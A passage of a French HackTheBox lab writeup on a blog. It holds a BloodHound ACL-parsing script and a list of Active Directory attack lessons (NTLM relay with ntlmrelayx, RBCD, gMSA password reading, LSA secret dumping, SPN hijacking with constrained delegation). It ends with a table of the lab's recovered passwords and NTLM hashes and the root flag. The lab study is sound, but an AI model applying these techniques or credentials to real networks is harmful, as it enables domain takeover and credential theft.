+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> item <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;data&#39;</span>, []):
+</span></span><span style="display:flex;"><span>            sid <span style="color:#f92672">=</span> item<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;ObjectIdentifier&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>            name <span style="color:#f92672">=</span> item<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Properties&#39;</span>, {})<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;name&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> sid <span style="color:#f92672">and</span> name:
+</span></span><span style="display:flex;"><span>                sid_map[sid] <span style="color:#f92672">=</span> name
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dump ALL non-inherited, non-admin ACEs</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> fpath <span style="color:#f92672">in</span> files:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(fpath) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>load(f)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> item <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;data&#39;</span>, []):
+</span></span><span style="display:flex;"><span>            target <span style="color:#f92672">=</span> item<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Properties&#39;</span>, {})<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;name&#39;</span>, <span style="color:#e6db74">&#39;UNKNOWN&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> ace <span style="color:#f92672">in</span> item<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Aces&#39;</span>, []):
+</span></span><span style="display:flex;"><span>                right <span style="color:#f92672">=</span> ace<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;RightName&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>                inh <span style="color:#f92672">=</span> ace<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;IsInherited&#39;</span>, <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>                psid <span style="color:#f92672">=</span> ace<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;PrincipalSID&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>                pname <span style="color:#f92672">=</span> sid_map<span style="color:#f92672">.</span>get(psid, psid)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> inh <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;ADMIN&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> pname<span style="color:#f92672">.</span>upper() \
+</span></span><span style="display:flex;"><span>                   <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;DOMAIN ADMIN&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> pname<span style="color:#f92672">.</span>upper():
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>pname<span style="color:#e6db74">}</span><span style="color:#e6db74"> --[</span><span style="color:#e6db74">{</span>right<span style="color:#e6db74">}</span><span style="color:#e6db74">]--&gt; </span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
+</span></span></code></pre></div><hr>
+<h2 id="leçons-apprises">Leçons apprises<a hidden class="anchor" aria-hidden="true" href="#leçons-apprises">#</a></h2>
+<ol>
+<li>
+<p><strong>Pre-Windows 2000 = creds gratuites</strong> - Les comptes machines créés en mode compatible ont password = nom machine. Toujours tester avec <code>nxc smb</code> même si le logon SMB échoue (STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT = password correct).</p>
+</li>
+<li>
+<p><strong>Les comptes machines ont des droits différents via Kerberos</strong> - Simple LDAP bind refuse les WORKSTATION_TRUST (erreur 710). Kerberos bypass cette restriction → <code>impacket-getTGT</code> + <code>bloodyAD -k</code>.</p>
+</li>
+<li>
+<p><strong>gMSA = pivot latéral</strong> - Les gMSA dans Remote Management Users donnent WinRM sur le DC. Toujours vérifier qui peut lire <code>msDS-ManagedPassword</code>.</p>
+</li>
+<li>
+<p><strong>DC dual-homed = réseau interne</strong> - Le port 2179 (Hyper-V) était l&rsquo;indice. <code>ipconfig /all</code> révèle le subnet interne. Ligolo-ng pour pivoter.</p>
+</li>
+<li>
+<p><strong>SMB signing disabled = relay</strong> - ntlmrelayx avec <code>--remove-mic</code> pour LDAP relay. <code>--delegate-access</code> pour RBCD automatique quand Shadow Credentials échoue.</p>
+</li>
+<li>
+<p><strong>DefaultPassword dans les LSA Secrets</strong> - Windows autologon stocke le password en clair dans le registre. <code>secretsdump -use-vss</code> l&rsquo;extrait.</p>
+</li>
+<li>
+<p><strong>ForceChangePassword ≠ Change Password</strong> - Pas besoin de l&rsquo;ancien password. bloodyAD le gère parfaitement.</p>
+</li>
+<li>
+<p><strong>SPN Hijacking + KCD = Domain Admin</strong> - Si on a WriteSPN sur un objet ET un compte avec Constrained Delegation, on peut déplacer le SPN cible et utiliser <code>-altservice</code> pour obtenir un ticket chiffré avec la clé du DC.</p>
+</li>
+<li>
+<p><strong>La route Ligolo disparaît à chaque reconnexion de l&rsquo;agent</strong> - Toujours re-ajouter <code>sudo ip route add 192.168.100.0/24 dev ligolo</code>.</p>
+</li>
+<li>
+<p><strong>BloodHound est indispensable</strong> - Sans la cartographie ACL, on n&rsquo;aurait jamais trouvé ForceChangePassword et WriteSPN. Même le parser JSON custom suffit quand la GUI n&rsquo;est pas dispo.</p>
+</li>
+</ol>
+<h2 id="credentials-récupérées">Credentials récupérées<a hidden class="anchor" aria-hidden="true" href="#credentials-récupérées">#</a></h2>
+<table>
+<thead>
+<tr>
+<th>Account</th>
+<th>Type</th>
+<th>Credential</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>pentest</td>
+<td>Password</td>
+<td>p3nt3st2025!&amp;</td>
+</tr>
+<tr>
+<td>MS01$</td>
+<td>Password</td>
+<td>ms01</td>
+</tr>
+<tr>
+<td>EXCH01$</td>
+<td>Password</td>
+<td>exch01</td>
+</tr>
+<tr>
+<td>gMSA_ADCS_prod$</td>
+<td>NTLM</td>
+<td>25c7f0eb586ed3a91375dbf2f6e4a3ea</td>
+</tr>
+<tr>
+<td>gMSA_ADFS_prod$</td>
+<td>NTLM</td>
+<td>fd9ea7ac7820dba5155bd6ed2d850c09</td>
+</tr>
+<tr>
+<td>a.white</td>
+<td>Password</td>
+<td>E2nvAOKSz5Xz2MJu</td>
+</tr>
+<tr>
+<td>a.white_adm</td>
+<td>Password</td>
+<td>Hacked123! (reset)</td>
+</tr>
+<tr>
+<td>WEB01$ local Admin</td>
+<td>NTLM</td>
+<td>b1aac1584c2ea8ed0a9429684e4fc3e5</td>
+</tr>
+<tr>
+<td>LPQQLPUC$</td>
+<td>Password</td>
+<td>eCWqO6GJrjvDqy}</td>
+</tr>
+</tbody>
+</table>
+<h2 id="flags">Flags<a hidden class="anchor" aria-hidden="true" href="#flags">#</a></h2>
+<ul>
+<li><strong>User:</strong> (sur WEB01)</li>
+<li><strong>Root:</strong> 785f845ea1967d0c434cd350f1468ad1</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://keyll0ger.github.io/tags/htb/">HTB</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/windows/">Windows</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/hard/">Hard</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/active-directory/">Active Directory</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/kerberos/">Kerberos</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/ntlm-relay/">NTLM Relay</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/rbcd/">RBCD</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/gmsa/">GMSA</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/spn-hijacking/">SPN Hijacking</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://keyll0ger.github.io/posts/nanocorp/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>NanoCorp - HackTheBox Writeup</span>
+  </a>
+  <a class="next" href="https://keyll0ger.github.io/posts/principal/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Principal - HackTheBox Writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://keyll0ger.github.io/">keyll0ger</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
